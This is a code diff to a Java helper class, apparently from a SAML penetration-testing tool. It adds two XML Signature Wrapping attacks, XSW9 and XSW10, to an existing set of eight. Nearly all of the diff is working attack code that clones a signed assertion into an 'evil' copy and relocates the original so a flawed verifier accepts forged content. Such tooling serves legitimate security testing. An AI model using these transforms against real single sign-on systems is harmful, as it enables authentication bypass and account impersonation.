@@ -10,7 +10,7 @@ import org.w3c.dom.Element;
 
 public class XSWHelpers {
 
-	public final static String[] xswTypes = {"XSW1", "XSW2", "XSW3", "XSW4", "XSW5", "XSW6", "XSW7", "XSW8"};
+	public final static String[] xswTypes = {"XSW1", "XSW2", "XSW3", "XSW4", "XSW5", "XSW6", "XSW7", "XSW8", "XSW9", "XSW10"};
 	
 	/*
 	 * Following are the 8 common XML Signature Wrapping attacks implemented, which were found
@@ -44,6 +44,12 @@ public class XSWHelpers {
 				break;
 			case "XSW8":
 				applyXSW8(document);
+				break;
+			case "XSW9":
+				applyXSW9(document);
+				break;
+			case "XSW10":
+				applyXSW10(document);
 				break;
 		}
 	}
@@ -127,7 +133,31 @@ public class XSWHelpers {
 		originalSignature.appendChild(object);
 		object.appendChild(assertion);
 	}
-	
+
+	public void applyXSW9(Document document){
+		Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
+		Element evilAssertion = (Element) assertion.cloneNode(true);
+		Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
+		assertion.removeChild(copiedSignature);
+		evilAssertion.setAttribute("ID", "_evil_assertion_ID");
+		document.getDocumentElement().insertBefore(evilAssertion, assertion);
+
+	}
+
+	public void applyXSW10(Document document){
+		Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
+		Element evilAssertion = (Element) assertion.cloneNode(true);
+
+		Element extensions = document.createElement("Extensions");
+		document.getDocumentElement().insertBefore(extensions, assertion);
+		document.getDocumentElement().insertBefore(evilAssertion, assertion);
+
+		Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
+		assertion.removeChild(copiedSignature);
+
+		extensions.appendChild(assertion);
+	}
+
 	public String diffLineMode(String text1, String text2) {
 		diff_match_patch differ = new diff_match_patch();
 		differ.Diff_Timeout = 5;
